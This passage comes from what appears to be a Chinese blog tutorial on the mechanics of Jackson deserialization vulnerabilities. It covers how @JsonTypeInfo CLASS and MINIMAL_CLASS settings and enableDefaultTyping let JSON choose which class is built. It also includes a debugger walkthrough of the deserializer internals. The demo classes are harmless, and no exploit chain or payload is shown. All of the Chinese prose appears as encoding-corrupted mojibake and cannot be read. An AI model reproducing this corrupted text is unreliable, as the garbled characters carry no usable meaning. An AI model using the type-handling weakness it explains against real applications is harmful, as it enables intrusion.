ç±»ä¸­çš„ object å±æ€§ <code>@JsonTypeInfo</code> æ³¨è§£å€¼ä¸º <code>JsonTypeInfo.Id.CLASS</code></p><p>è¾“å‡ºçœ‹åˆ°ï¼Œobjectå±æ€§ä¸­å¤šäº† <code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code> ï¼Œå³å«æœ‰å…·ä½“çš„ç±»çš„ä¿¡æ¯ï¼ŒåŒæ—¶ååºåˆ—åŒ–å‡ºæ¥çš„objectå±æ€§Hackerç±»å¯¹è±¡ï¼Œå³èƒ½å¤ŸæˆåŠŸå¯¹æŒ‡å®šç±»å‹è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">55</span>f3ddb1</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨Jacksonååºåˆ—åŒ–çš„æ—¶å€™å¦‚æœä½¿ç”¨äº†<code>JsonTypeInfo.Id.CLASS</code>ä¿®é¥°çš„è¯ï¼Œå¯ä»¥é€šè¿‡@classçš„æ–¹å¼æŒ‡å®šç›¸å…³ç±»ï¼Œå¹¶è¿›è¡Œç›¸å…³è°ƒç”¨ã€‚</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>ä¿®æ”¹ Person2 ç±»ä¸­çš„objectå±æ€§ <code>@JsonTypeInfo</code> æ³¨è§£å€¼ä¸º <code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p><p>è¾“å‡ºçœ‹åˆ°ï¼Œobjectå±æ€§ä¸­å¤šäº† <code>&quot;@c&quot;:&quot;com.drunkbaby.Hacker&quot;</code>ï¼Œå³ä½¿ç”¨ @c æ›¿ä»£äº† @classï¼Œå®˜æ–¹æè¿°ä¸­çš„æ„æ€æ˜¯ç¼©çŸ­äº†ç›¸å…³ç±»åï¼Œå®é™…æ•ˆæœå’Œ JsonTypeInfo.Id.CLASS ç±»ä¼¼ï¼Œèƒ½å¤ŸæˆåŠŸå¯¹æŒ‡å®šç±»å‹è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œéƒ½å¯ä»¥ç”¨äºæŒ‡å®šç›¸å…³ç±»å¹¶è¿›è¡Œç›¸å…³çš„è°ƒç”¨ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@c&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">18</span>be83e4</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>ä¿®æ”¹ Person2 ç±»ä¸­çš„objectå±æ€§ <code>@JsonTypeInfo</code> æ³¨è§£å€¼ä¸º <code>JsonTypeInfo.Id.NAME</code></p><p>è¾“å‡ºçœ‹åˆ°ï¼Œobject å±æ€§ä¸­å¤šäº† <code>&quot;@type&quot;:&quot;Hacker&quot;</code>ï¼Œä½†æ²¡æœ‰å…·ä½“çš„åŒ…ååœ¨å†…çš„ç±»åï¼Œå› æ­¤åœ¨åé¢çš„ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè®¾ç½®å€¼æ˜¯ä¸èƒ½è¢«ååºåˆ—åŒ–åˆ©ç”¨çš„ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/errorName.png" class><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>å…¶å®è¿™ä¸ªå€¼æ—¶æä¾›ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„æ„æ€ï¼Œæˆ‘ä»¬æ˜¯æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨çš„ï¼Œéœ€è¦æ‰‹åŠ¨å†™ä¸€ä¸ªè§£æå™¨æ‰èƒ½é…åˆä½¿ç”¨ï¼Œç›´æ¥è¿è¡Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼š</p><h4 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>ç”±å‰é¢æµ‹è¯•å‘ç°ï¼Œå½“ <code>@JsonTypeInfo</code> æ³¨è§£è®¾ç½®ä¸ºå¦‚ä¸‹å€¼ä¹‹ä¸€å¹¶ä¸”ä¿®é¥°çš„æ˜¯ Object ç±»å‹çš„å±æ€§æ—¶ï¼Œå¯ä»¥åˆ©ç”¨æ¥è§¦å‘ Jackson ååºåˆ—åŒ–æ¼æ´ï¼š</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo. Id. MINIMAL_CLASS</li></ul><h2 id="0x03-ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨"><a href="#0x03-ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="0x03 ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨"></a>0x03 ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨</h2><p>è¿™é‡Œåªé’ˆå¯¹ Jackson ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å­˜åœ¨çš„ä¸€äº›æ–¹æ³•è°ƒç”¨è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”åªé’ˆå¯¹åº”ç”¨ JacksonPolymorphicDeserialization æœºåˆ¶çš„åœºæ™¯è¿›è¡Œåˆ†æã€‚</p><p>ä¸‹é¢ç®€å•çœ‹ä¸‹ä¸¤ä¸ªå®ç°æ–¹å¼é—´æ˜¯å¦æœ‰åŒºåˆ«ã€‚</p><h3 id="å½“ä½¿ç”¨-DefaultTyping-æ—¶"><a href="#å½“ä½¿ç”¨-DefaultTyping-æ—¶" class="headerlink" title="å½“ä½¿ç”¨ DefaultTyping æ—¶"></a>å½“ä½¿ç”¨ DefaultTyping æ—¶</h3><p>æ–°å¢ Person3 ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ MySex ç±»ä¸­çš„æ–¹æ³•ä¸­æ·»åŠ è¾“å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex2</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex2</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySexæ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ååºåˆ—åŒ–ä»£ç ï¼Œåªè¿›è¡Œååºåˆ—åŒ–æ“ä½œå¹¶è°ƒç”¨æ— å‚æ•°çš„ <code>enableDefaultTyping()</code> ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">            mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">            <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">            System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œçœ‹åˆ°è°ƒç”¨äº†ç›®æ ‡ç±»çš„æ„é€ å‡½æ•°å’Œ setter æ–¹æ³•ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializationTest.png" class><h3 id="å½“ä½¿ç”¨-JsonTypeInfo-æ³¨è§£æ—¶"><a href="#å½“ä½¿ç”¨-JsonTypeInfo-æ³¨è§£æ—¶" class="headerlink" title="å½“ä½¿ç”¨ @JsonTypeInfo æ³¨è§£æ—¶"></a>å½“ä½¿ç”¨ @JsonTypeInfo æ³¨è§£æ—¶</h3><p>ä¿®æ”¹ Person3 ç±»ï¼Œåœ¨ sex å±æ€§å‰æ·»åŠ æ³¨è§£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line">    <span class="comment">// æˆ– @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  </span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ DeserializationTest2. javaï¼Œæ³¨é‡Šæ‰ enableDefaultTyping ()ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest2</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line"><span class="comment">//        mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œå’Œä½¿ç”¨ DefaultTyping æ˜¯ä¸€æ ·çš„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySexæ„é€ å‡½æ•°</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.deserialization.MySex2@<span class="number">6</span>a2bcfcb</span><br></pre></td></tr></table></figure><h3 id="Jackson-ååºåˆ—åŒ–è°ƒè¯•åˆ†æ"><a href="#Jackson-ååºåˆ—åŒ–è°ƒè¯•åˆ†æ" class="headerlink" title="Jackson ååºåˆ—åŒ–è°ƒè¯•åˆ†æ"></a>Jackson ååºåˆ—åŒ–è°ƒè¯•åˆ†æ</h3><p>Jackson ååºåˆ—åŒ–çš„è¿‡ç¨‹å…¶å®å°±åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹ï¼Œç¬¬äºŒéƒ¨æ˜¯è®¾ç½®å®ä¾‹çš„å±æ€§å€¼ã€‚</p><p>è¿™é‡Œä»¥ç¬¬ä¸€ä¸ªä¾‹å­æ¥è¿›è¡Œ Jackson ååºåˆ—åŒ–è¿‡ç¨‹çš„è°ƒè¯•åˆ†æï¼Œåœ¨ <code>Person p2 = mapper.readValue(json, Person.class);</code> å¤„æ‰“ä¸Šæ–­ç‚¹ï¼ŒåŒæ—¶åœ¨ MySex2 ç±»çš„æ„é€ å‡½æ•°ã€getterã€setter æ–¹æ³•ä¸­è®¾ç½®æ–­ç‚¹ï¼Œç„¶åå¼€å§‹è°ƒè¯•</p><p>å¦å¤–ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œç»™ Person3 ç±»åŠ ä¸Šä¸ªæ„é€ å‡½æ•°ï¼Œéšåå¼€å§‹è°ƒè¯•</p><p>é¦–å…ˆååºåˆ—åŒ–è·Ÿè¿›æ¥ï¼Œåœ¨ <code>com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose()</code> æ–¹æ³•è¿™é‡Œï¼Œå…ˆè¿›è¡Œ <code>JsonToken</code> çš„åˆå§‹åŒ–ï¼Œéšåè¿›è¡Œè¿›ä¸€æ­¥çš„ååºåˆ—åŒ–æ“ä½œã€‚</p><p>å½“åˆå§‹åŒ–æ˜¯ç¬¬ä¸€æ¬¡çš„æ—¶å€™ï¼Œä¼šå…ˆè°ƒåˆ° <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserialize()</code> æ–¹æ³•</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/vanillaDeserialize.png" class><p>è·Ÿè¿›ï¼Œ<code>vanillaDeserialize()</code> æ–¹æ³•è°ƒç”¨äº† <code>createUsingDefault()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯è°ƒç”¨æŒ‡å®šç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œç”Ÿæˆç±»å®ä¾‹ã€‚</p><p>å†æ¬¡è·Ÿè¿›å°±æ˜¯è°ƒç”¨ <code>call()</code> æ–¹æ³•äº†</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/call.png" class><p>èµ°åˆ°äº†æ„é€ å‡½æ•°</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/constructor.png" class><p>åœ¨åˆå§‹åŒ–å®Œæ¯•ä¹‹åï¼Œä¼šè°ƒç”¨ <code>deserializeAndSet()</code> æ–¹æ³•ï¼Œå®Œæˆäº†ä¸€ä¸ªåµŒå¥—çš„è¿‡ç¨‹ï¼Œå…·ä½“çš„ç»†èŠ‚åé¢ä¼šè®²ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSetFirst.png" class><p>è·Ÿè¿›å»ä¹‹åä¼šå‘ç°è¿™é‡Œè°ƒç”¨äº† <code>this.deserialize()</code> æ–¹æ³•ï¼Œè·Ÿè¿› <code>deser.deserialize()</code>ï¼Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘æ˜¯åœ¨ <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserializeAndSet()</code> æ–¹æ³•æ‰§è¡Œçš„ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„ <strong>Jackson ååºåˆ—åŒ–çš„è¿‡ç¨‹å…¶å®å°±åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹ï¼Œç¬¬äºŒéƒ¨æ˜¯è®¾ç½®å®ä¾‹çš„å±æ€§å€¼ã€‚</strong> è·Ÿè¿›</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSet.png" class><p>ç»§ç»­è·Ÿè¿› <code>this.deserialize()</code>ï¼Œè¿™é‡Œå…ˆæ‹¿äº† json æ•°æ®çš„æ•°æ®ç±»å‹ï¼Œæ¥ä¸‹æ¥åˆ¤æ–­è¿™ä¸ªèŠ‚ç‚¹çš„æ•°æ®ç±»å‹æ˜¯å¦ä¸º nullï¼Œå¦‚æœä¸ä¸º nullï¼Œå†åˆ¤æ–­ <code>this._valueTypeDeserializer</code> æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™ç»§ç»­è°ƒç”¨ <code>this._valueDeserializer.deserialize()</code> æ–¹æ³•</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/businessDeser.png" class><p>è¿™é‡Œ t æ˜¯å­˜åœ¨çš„ï¼Œä¸”ååºåˆ—åŒ–ç¨‹åºä¹Ÿæ˜¯å­˜åœ¨çš„ï¼Œæ‰€ä»¥è°ƒç”¨ <code>deserialize()</code> æ–¹æ³•</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/judgeDeserialize.png" class><p>åˆ¤æ–­æ˜¯å¦ä¸º <code>VALUE_NUMBER_INT</code>ï¼Œå¦‚æœæ˜¯åˆ™è·Ÿè¿› <code>getIntValue()</code> æ–¹æ³•ï¼Œå¦‚æœä¸æ˜¯åˆ™è·Ÿè¿› <code>_parseInteger()</code> æ–¹æ³•ï¼Œè¿™é‡Œæœ€ç»ˆæ•´ä¸ªè°ƒå®Œä¹‹åï¼Œä¼šè¿”å› json é”®å€¼å¯¹ä¸­çš„å€¼</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/objectValue.png" class><p>éšåçš„ <code>this._field.set(instance, value);</code> æ„æ€å°±æ˜¯è°ƒç”¨å¯¹åº”ç±»çš„ setter æ–¹æ³•äº†ï¼Œè¿›è¡Œèµ‹å€¼ã€‚å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰å†™ Person3 è¿™ä¸ªç±»çš„ setter æ–¹æ³•ï¼Œå¦‚æœå®ç°äº† setter æ–¹æ³•ï¼Œåˆ™ä»£ç é€»è¾‘ä¼šèµ°è¿›å»ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/invokeForSetter.png" class><p>åœ¨è°ƒç”¨å®Œæˆä¹‹ååˆä¼šé‡æ–°å›åˆ° <code>BeanDeserializer.vanillaDeserialize()</code>  å‡½æ•°ä¸­çš„ do while å¾ªç¯ï¼Œç»§ç»­è·å–å€¼ï¼Œç»§ç»­è°ƒç”¨ï¼Œè¾¾åˆ°é€’å½’çš„æ•ˆæœã€‚</p><p>ä¸å¤ªä¸€æ ·çš„æ˜¯åœ¨ <code>SettableBeanProperty.deserialize()</code>  å‡½æ•°ä¸­è¿›å…¥åˆ°äº†è°ƒç”¨ <code>deserializeWithType()</code> å‡½æ•°è§£æçš„ä»£ç é€»è¾‘ï¼Œå› ä¸ºæ­¤æ—¶ <code>_valueTypeDeserializer</code> å€¼ä¸ä¸º nullï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/diffDeserialize.png" class><p>å¾€ä¸‹ï¼Œå…ˆåˆ¤æ–­ååºåˆ—åŒ–çš„ç±»å‹ï¼Œå› ä¸ºè¿™é‡Œæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥ä¼šè¿”å› nullï¼Œå†è·Ÿè¿› <code>deserializeTypedFromObject()</code> æ–¹æ³•</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromObject.png" class><p>åŒæ ·å› ä¸ºæ˜¯æ•°ç»„ï¼Œè·Ÿè¿› <code>_deserializeTypedUsingDefaultImpl()</code> æ–¹æ³•</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedUsingDefaultImpl.png" class><p>éšåå¯»æ‰¾ååºåˆ—åŒ–çš„ç±»</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/findDefaultImplDeserializer.png" class><p>å› ä¸ºè¿™é‡Œçš„æ•°æ®ç±»å‹æ˜¯æ•°ç»„ï¼Œä¸åŒ¹é…ä»»æ„ä¸€é¡¹ï¼Œæ‰€ä»¥æœ€åè°ƒç”¨äº† <code>deserializeTypedFromAny()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æœ€ç»ˆæ˜¯è®©ç¨‹åºå»å·²æœ‰çš„ç±»é‡Œé¢æ‰¾ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæ‰¾çš„æ˜¯ <code>com.drunkbaby.deserialization.MySex2</code> ç±»</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromAny.png" class><p>è·Ÿè¿›å»ï¼Œå…¶ä¸­è°ƒç”¨ <code>findContextualValueDeserializer()</code> æ‰¾åˆ° typeId ç±»å‹å¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼Œç„¶åç¼“å­˜åˆ° <code>_deserializers</code> è¿™ä¸ª Map å˜é‡ä¸­ï¼Œç„¶åè¿”å›è¯¥ååºåˆ—åŒ–å™¨</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/putTypeID.png" class><p>æ¥ç€ç¨‹åºå›åˆ°æ•°ç»„ç±»å‹è§£æçš„ <code>AsArrayTypeDeserializer._deserialize()</code> 